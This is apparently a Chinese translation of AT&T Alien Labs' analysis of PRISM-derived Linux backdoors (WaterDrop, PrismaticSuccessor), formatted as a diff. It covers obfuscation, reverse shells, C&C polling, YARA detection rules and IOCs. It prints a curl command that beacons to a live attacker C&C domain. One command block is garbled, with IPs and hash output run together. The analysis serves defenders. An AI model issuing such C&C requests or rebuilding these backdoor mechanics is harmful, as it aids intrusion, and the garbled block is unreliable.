@@ -1,0 +1,356 @@
+AT&T 的安全研究人员最近发现了一组隐蔽性极强的 ELF 可执行文件，它们在 VirusTotal 上的杀软检出率很低或为零。在分析样本后，AT&T
+已将它们确定为多个攻击者在多次攻击行动中使用的开源 PRISM 后门的修改版。
+
+深入分析了使用这些恶意软件的攻击活动，在长达三年半的时间内这些攻击者仍然保持活跃。最早的攻击行动中的样本出现在 2017 年 11 月 8
+日。![](https://image.3001.net/images/20210911/1631373851_613cca1b2438beb8ffa03.jpg!small)
+
+## WaterDrop 分析
+
+WaterDrop 的变种很容易识别，它包含一个名为 `xencrypt`的函数，该函数使用硬编码的单字节 `0x1F`密钥执进行异或加密。从
+WaterDrop 变种的第 7 版开始，恶意样本也包含纯文本字符串 `WaterDropx vX started`，其中 X
+是恶意样本的版本号。到目前为止，已经观察到版本 1、2.2 和 3 使用 PRISM 命名，而版本 7、9 和 12 被命名为 WaterDropx。
+
+WaterDrop 使用 `agent-waterdropx`作为 User-Agent 进行 HTTP 协议的 C&C 通信，C&C 使用
+waterdropx.com 域名的子域名。
+
+尽管这些都是非常明显的特征，但攻击者仍然保持了在 VirusTotal 上极低的检出率，这可能是因为攻击行动的规模较小。
+
+攻击者在 2017 年 8 月 18 日注册 waterdropx.com 域名。截至 2021 年 8 月 10 日，该域名仍在使用。
+
+除了 PRISM 的基本功能外，WaterDrop 还额外引入了异或加密与定期轮询 C&C
+服务器的功能。![](https://image.3001.net/images/20210911/1631373854_613cca1e5392d605e2a0c.png!small)
+
+恶意软件与 C&C 服务器的通信是纯文本 HTTP 协议，且所有版本的恶意软件都使用了 `agent-waterdropx`作为 User-Agent。
+
+一些变种还会在以 root
+权限执行时加载内核模块。![](https://image.3001.net/images/20210911/1631373858_613cca22ba40ceb42212c.jpg!small)
+
+## 版本进化
+
+### PRISM v1
+
+第一个版本的样本就是使用 waterdropx.com 作为 C&C 域名的攻击者使用的，他们的 User-Agent 相同。
+
+与公开的 PRISM 相比，该版本创建了子进程，该子进程不断向 C&C 服务器轮询要执行的命令。
+
+    
+    
+    curl -A 'agent-waterdropx' 'http://r.waterdropx.com:13858/tellmev2.x?v=1&act=touch'
+
+第一个版本的样本没有对恶意样本进行任何混淆、加壳或者加密。
+
+### PRISM v2.2
+
+2.2 版本的 PRISM 开始使用异或加密来处理敏感数据，例如使用的 shell 命令等。单字节密钥硬编码为
+`0x1F`，该密钥用于发现同一攻击者的所有样本。
+
+对于这个版本的恶意软件，初始的 C&C URI 请求格式是：
+
+    
+    
+    /tellmev2.x?v=2.2&act=touch
+
+### PRISM v3
+
+3 版本的 PRISM 与 2.2 版本基本相同，额外多了 BOT ID 被保存到
+/etc/.xid。![](https://image.3001.net/images/20210911/1631373861_613cca25054f4bfa76fe6.jpg!small)
+
+初始请求格式为：
+
+    
+    
+    /tellmev2.x?v=3&act=touch&xid=
+
+### PRISM v7
+
+Waterdrop v7 引入了内核模块的使用，如果进程具有 root 权限，则使用 insmod 安装。安全分析人员暂时无法确定此 Payload
+的用途。
+
+其余代码与 PRISM v3 相同，仅更改了硬编码版本号。其初始请求格式为：
+
+    
+    
+    /tellmev2.x?v=7&act=touch&xid=
+
+### PRISM v9
+
+延续之前版本的风格，Waterdrop v9 的变化微乎其微。在这个版本中发现的唯一变化是，使用 BOT ID 作为 ICMP 密码来生成反向
+Shell，而不是使用硬编码的 ICMP 密码。
+
+初始请求格式为：
+
+    
+    
+    /tellmev2.x?v=9&act=touch&xid=
+
+### PRISM v12
+
+Waterdrop v12 与其前序版本几乎相同，但增强了后门的稳定性。
+
+其初始请求格式为：
+
+    
+    
+    /tellmev2.x?v=12&act=touch&xid=
+
+## 恶意软件家族 PrismaticSuccessor
+
+域名 z0gg.me 可解析为由另外 12 个域名共享的 IP
+地址。![](https://image.3001.net/images/20210911/1631373863_613cca272450c986f9aa6.jpg!small)
+
+一些存在重叠的域名是已知的 PRISM 的 C&C 域名，但 z0gg.me 也与几个其他恶意样本存在关联。特别是，观察到与
+`https://github.com/lirongchun/i`存储库有关。
+
+在这个存储库中，可以观察到以下文件：
+
+> 三个包含 IP 地址（README.md）和端口号（README1.md 和 MP.md）的文档
+>
+> 针对脏牛（CVE-2016-5195）漏洞的 Bash 脚本，名为
+>
+> `111`
+>
+> 几个 ELF 二进制文件，包括：
+>
+> 1.git：自定义恶意软件植入工具
+>
+> 2.ass：为 x64 架构编译的名为`hide my ass`的开源安全工具
+>
+> 3.ass32：为 x86 架构编译的名为`hide my ass`的开源安全工具
+
+由于攻击者使用公共 GIT 存储库来托管其恶意软件和基础设施信息，可以查看历史数据观察其演变。
+
+例如，我们可以使用以下命令收集参与者用作 C&C 服务器的所有 IP 地址：
+
+    
+    
+    $ git log -p README.md |grep "^+"|grep -v "++++45.199.88[.]86+154.48.227[.]27+207.148.118[.]141+154.48.227[.]27+165.22.136[.]80+154.48.227[.]27+156.236.110[.]79+43.230.11[.]125+172.247.127[.]136+127.0.0[.1]+192.168.3[.]173+192.168.3[.]173:80+192.168.3[.]173+118.107.180[.]8+s.rammus[.]me+s.rammus[.]me:80+192.168.3[.]150:80+192.168.3[.]150^80+192.168.3[.]150^+^192.168.3[.]150+^192.168.3[.]133$ shasum -a 256 *933b4c6c48f82bbb62c9b1a430c7e758b88c03800c866b36c2da2a5f72c93657  MP.outf19043c7b06db60c8dd9ff55636f9d43b8b0145dffe4c6d33c14362619d10188  giteeabee866fd295652dd3ddbc7552a14953d91b455ebfed02d1ccdee6c855718d  git (1)3a4998bb2ea9f4cd2810643cb2c1dae290e4fe78e1d58582b6f49b232a58575a  git (2)3366676681a31feadecfe7d0f5db61c4d6085f5081b2d464b6fe9b63750d4cd8  git (3)cc3752cc2cdd595bfed492a2f108932c5ac28110f5f0d30de8681bd10316b824  git (4)baf2fa00711120fa43df80b8a043ecc0ad26edd2c5d966007fcd3ffeb2820531  git (5)eb64ee2b6fc52c2c2211018875e30ae8e413e559bcced146af9aa84620e3312f  git443d1d65b9d3711871d8f7ad1541cfbb7fa35ecc1df330699b75dd3c1403c754278  git5377ddc6be62724ca57ff45003c5d855df5ff2b234190290545b064ee4e1145f63  gitest1de9232f0bec9bd3932ae3a7a834c741c4c378a2350b4bbb491a102362235017  hostname7ed15e59a094ca0f9ccac4c02865172ad67dcfc5335066f67fe3f11f68dd7473  ps1eb6973f70075ede421bed604d7642fc844c5a47c53d0fb7a9ddb21b0bb2519a  wm6f983303bb82d8cc9e1ebf8c6c1eb7c17877debc66cd1ac7c9f78b24148a4e46  wm (1)e4fe57d9d2c78a097f38cba7a9aad7ca53da24ecbcad0c1e00f21d34d8a82de4  wm32b08d48cc12c6afa5821a069bd6895175d5db4b5a9dde4e04d587c3dec68b1920  wmgithub
+
+按大小进行分组，可以发现大约 15K 的样本是 PRISM 后门，而大约 1.1 MB 的样本是另外的恶意软件。
+
+攻击者在 2019 年 7 月 16 日提交了自定义 implant，该恶意软件使用修改版的 UPX 加壳。
+
+![](https://image.3001.net/images/20210911/1631373865_613cca296b9d1058468a0.jpg!small)
+
+恶意软件明显变大是由于二进制文件静态编译进了 libcurl，AT&T 将这个恶意软件家族命名为 `PrismaticSuccessor`。
+
+分析可知，配置由两个 URL 组成：
+
+> HostUrl 用于获取 C&C 主机
+>
+> PortUrl 用于获取端口号
+
+执行后会尝试加锁 `/var/lock/sshd.lock`来当作互斥量。
+
+![](https://image.3001.net/images/20210911/1631373867_613cca2b4056d1622a45d.jpg!small)
+
+接下来，恶意软件解密包含进程名称的字符串，该字符串用于覆盖 `argv`。
+
+![](https://image.3001.net/images/20210911/1631373869_613cca2d38d62ff6cd992.jpg!small)
+
+请注意，aMcwfkvf 变量包含 `[mcwfkvf]`值，该值在 `src`中被解密为 `[kauditd]`。解密使用 ROT13，密钥为 -2。这个
+ROT13 只处理大小字母，不处理符号和数字。
+
+![](https://image.3001.net/images/20210911/1631373870_613cca2ee959fb9ea460c.jpg!small)
+
+接下来，恶意软件通过子进程进行多任务处理。
+
+![](https://image.3001.net/images/20210911/1631373903_613cca4fab4f6c8bbed9e.jpg!small)
+
+某个子进程会打开一个硬编码 C&C 服务器的反向 Shell 会话，配置中最多有三个 C&C 地址（z0gg.me、x63.in 和 x47.in）并使用
+ROT13 加密。
+
+![](https://image.3001.net/images/20210911/1631373905_613cca513eba9260a5724.jpg!small)
+
+服务器还需要使用密码进行回复，以便成功建立反向 Shell。恶意软件会计算回复缓冲区的 MD5 哈希值，并将其与硬编码值
+`ef4a85e8fcba5b1dc95adaa256c5b482`进行比较。
+
+无论主 C&C 服务器是否成功联系，都会进行通信。
+
+![](https://image.3001.net/images/20210911/1631373907_613cca53257e977252d6c.jpg!small)
+
+某个子进程通过 GitHub 获取 C&C 主机和端口，并打开反向 Shell。
+
+![](https://image.3001.net/images/20210911/1631373909_613cca553333390712919.jpg!small)
+
+![](https://image.3001.net/images/20210911/1631373910_613cca56b37dfa4ee2f12.jpg!small)
+
+生成 Shell 的函数与 PRISM 源代码很相似，但不完全相同。
+
+![](https://image.3001.net/images/20210911/1631373912_613cca58593a9165ceba7.jpg!small)
+
+![](https://image.3001.net/images/20210911/1631373914_613cca5a3ef1a6e68b876.jpg!small)
+
+某个子进程跳转到 Shellcode 异或解密，硬编码的 8 字节密钥：
+
+![](https://image.3001.net/images/20210911/1631373920_613cca60ee8213e4dcf64.jpg!small)
+
+构建的命令如下所示：
+
+![](https://image.3001.net/images/20210911/1631373923_613cca6341906b6ba7960.jpg!small)
+
+在 StackOverflow 上也能发现有用户抱怨被攻击，与之相符。
+
+## 其他变种
+
+我们也观察到其他攻击者使用 PRISM 后门进行攻击。然而，在大多数情况下，攻击者者会原样使用原始的 PRISM
+后门，而不进行任何重大修改。某种程度上说，这也阻碍了我们正确跟踪攻击者的攻击行动。
+
+## 结论
+
+PRISM 是一个开源的、简单的后门。它的流量是清晰可辨的，恶意文件很容易被检测到。其 C&C
+服务器已经保持在线长达三年半。这表明，虽然受到更多关注的大型攻击行动通常会在数小时内被检测到，但较小的攻击行动可能会被漏掉。
+
+## 检测方法
+
+> rule PrismaticSuccessor : LinuxMalware  
+> {  
+> meta:  
+> author = "AlienLabs"  
+> description = "Prismatic Successor malware backdoor"  
+> reference =
+> "aaeee0e6f7623f0087144e6e318441352fef4000e7a8dd84b74907742c244ff5"  
+> copyright = "Alienvault Inc. 2021"
+>
+> strings:  
+> $s1 = "echo -e \""  
+> $s2 = "[\x1B[32m+\x1B[0m]`/bin/hostname`"  
+> $s3 = "[\x1B[32m+\x1B[0m]`/usr/bin/id`"  
+> $s4 = "[\x1B[32m+\x1B[0m]`uname -r`"  
+> $s5 = "[+]HostUrl->\t%s\n"  
+> $s6 = "[+]PortUrl->\t%s\n"  
+> $s7 = "/var/run/sshd.lock"
+>
+> $shellcode = {  
+> 48 31 C9  
+> 48 81 E9 [4]  
+> 48 8D 05 [4]  
+> 48 BB [8]  
+> 48 31 [2]  
+> 48 2D [2-4]  
+> E2 F4  
+> }
+>
+> $c1 = {  
+> 8B 45 ??  
+> BE 00 00 00 00  
+> 89 C7  
+> E8 [4]  
+> 8B 45 ??  
+> BE 01 00 00 00  
+> 89 C7  
+> E8 [4]  
+> 8B 45 ??  
+> BE 02 00 00 00  
+> 89 C7  
+> E8 [4]  
+> 8B 45 ??  
+> BA [4]  
+> BE [4]  
+> 89 C7  
+> E8  
+> }
+>
+> condition:  
+> uint32(0) == 0x464C457F and  
+> filesize > 500KB and filesize < 5MB and  
+> 5 of ($s*) and  
+> all of ($c*) and  
+> #shellcode == 2  
+> }
+>
+> rule PRISM {  
+> meta:  
+> author = "AlienLabs"  
+> description = "PRISM backdoor"  
+> reference = "https://github.com/andreafabrizi/prism/blob/master/prism.c"
+>
+> strings:  
+> $s1 = "I'm not root :("  
+> $s2 = "Flush Iptables:\t"  
+> $s3 = " Version:\t\t%s\n"  
+> $s4 = " Shell:\t\t\t%s\n"  
+> $s5 = " Process name:\t\t%s\n"  
+> $s6 = "iptables -F 2> /dev/null"  
+> $s7 = "iptables -P INPUT ACCEPT 2> /dev/null"  
+> $s8 = " started\n\n# "
+>
+> $c1 = {  
+> E8 [4] 8B 45 ?? BE 00 00 00 00 89 C7 E8 [4] 8B 45 ?? BE 01 00 00 00  
+> 89 C7 E8 [4] 8B 45 ?? BE 02 00 00 00 89 C7 E8 [4] BA 00 00 00 00  
+> BE [4] BF [4] B8 00 00 00 00 E8  
+> }  
+> $c2 = {  
+> BA 00 00 00 00  
+> BE 01 00 00 00  
+> BF 02 00 00 00  
+> E8 [4]  
+> 89 45 [1]  
+> 83 ?? ?? 00  
+> }
+>
+> condition:  
+> uint32(0) == 0x464C457F and  
+> filesize < 30KB and  
+> (4 of ($s*) or all of ($c*))  
+> }
+
+## IOC
+
+> 05fc4dcce9e9e1e627ebf051a190bd1f73bc83d876c78c6b3d86fc97b0dfd8e8  
+> 0af3e44967fb1b8e0f5026deb39852d4a13b117ee19986df5239f897914d9212  
+> 0f42b737e30e35818bbf8bd6e58fae980445f297034d4e07a7e62a606d219af8  
+> 0fba35856fadad942a59a90fc60784e6cceb1d8002af96d6cdf8e8c3533025f7  
+> 342e7a720a738bf8dbd4e5689cad6ba6a4fc6dd6808512cb4eb294fb3ecf61cd  
+> 3a3c701e282b7934017-dadc33d95e0cc57e43a124f14d852f39c2657e0081683  
+> 5999c1a4a281a853378680f20f6133e53c7f6d0167445b968eb49b844f37eab5  
+> 98fe5ed342da2b5a9d206e54b5234cfeeed35cf74b60d48eb0ef3dd1d7d7bd59  
+> a8c68661d1632f3a55ff9b7294d7464cc2f3ece63a782c962f1dc43f0f968e33  
+> af55b76d6c3c1f8368ddd3f9b40d1b6be50a2b97b25985d2dde1288ceab9ff24  
+> b6844ca4d1d7c07ed349f839c861c940085f1a30bbc3fc4aad0b496e8d492ce0  
+> b8215cafbea9c61df8835a3d52c40f9d2c6a37604dd329ef784e9d92bad1f30f  
+> b8cceb317a5d2febcd60318c1652af61cd3d4062902820e79a9fb9a4717f7ba2  
+> be7ec385e076c1c1f676d75e99148f05e754ef5b189e006fb53016ce9aef59e0  
+> c679600b75c6e84b53f4e6e21f3acbec1621c38940c8f3756d0b027c7a058d9c  
+> c802fa50409edf26e551ee0d134180aa1467a4923c759a2d3204948e14a52f12  
+> c8525243a68cba92521fb80a73136aaa19794b4772c35d6ecfec0f82ecad5207  
+> d3fa1155810be25f9b9a889ee64f845fc6645b2b839451b59cfa77bbc478531f  
+> dd5f933598184426a626d261922e1e82cb009910c25447b174d46e9cac3d391a  
+> e14d75ade6947141ac9b34f7f5743c14dbfb06f4dfb3089f82595d9b067e88c2  
+> f126c4f8b4823954c3c69121b0632a0e2061ef13feb348eb81f634379d011913  
+> 933b4c6c48f82bbb62c9b1a430c7e758b88c03800c866b36c2da2a5f72c93657  
+> aaeee0e6f7623f0087144e6e318441352fef4000e7a8dd84b74907742c244ff5  
+> baf2fa00711120fa43df80b8a043ecc0ad26edd2c5d966007fcd3ffeb2820531  
+> f19043c7b06db60c8dd9ff55636f9d43b8b0145dffe4c6d33c14362619d10188  
+> eeabee866fd295652dd3ddbc7552a14953d91b455ebfed02d1ccdee6c855718d  
+> 3a4998bb2ea9f4cd2810643cb2c1dae290e4fe78e1d58582b6f49b232a58575a  
+> 3366676681a31feadecfe7d0f5db61c4d6085f5081b2d464b6fe9b63750d4cd8  
+> cc3752cc2cdd595bfed492a2f108932c5ac28110f5f0d30de8681bd10316b824  
+> baf2fa00711120fa43df80b8a043ecc0ad26edd2c5d966007fcd3ffeb2820531  
+> eb64ee2b6fc52c2c2211018875e30ae8e413e559bcced146af9aa84620e3312f  
+> d1d65b9d3711871d8f7ad1541cfbb7fa35ecc1df330699b75dd3c1403c754278  
+> 77ddc6be62724ca57ff45003c5d855df5ff2b234190290545b064ee4e1145f63  
+> 1de9232f0bec9bd3932ae3a7a834c741c4c378a2350b4bbb491a102362235017  
+> 7ed15e59a094ca0f9ccac4c02865172ad67dcfc5335066f67fe3f11f68dd7473  
+> 1eb6973f70075ede421bed604d7642fc844c5a47c53d0fb7a9ddb21b0bb2519a  
+> 6f983303bb82d8cc9e1ebf8c6c1eb7c17877debc66cd1ac7c9f78b24148a4e46  
+> e4fe57d9d2c78a097f38cba7a9aad7ca53da24ecbcad0c1e00f21d34d8a82de4  
+> b08d48cc12c6afa5821a069bd6895175d5db4b5a9dde4e04d587c3dec68b1920  
+> 457467.com  
+> zzz.457467.com  
+> rammus.me  
+> s.rammus.me  
+> sw.rammus.me  
+> wa1a1.com  
+> www.wa1a1.com  
+> waterdropx.com  
+> r.waterdropx.com  
+> spmood222.mooo.com  
+> z0gg.me  
+> x63.in  
+> x47.in  
+> 45.199.88.86
+
+## 参考来源
+
+> [AT&T﻿](https://cybersecurity.att.com/blogs/labs-research/prism-attacks-fly-> under-the-radar)
+
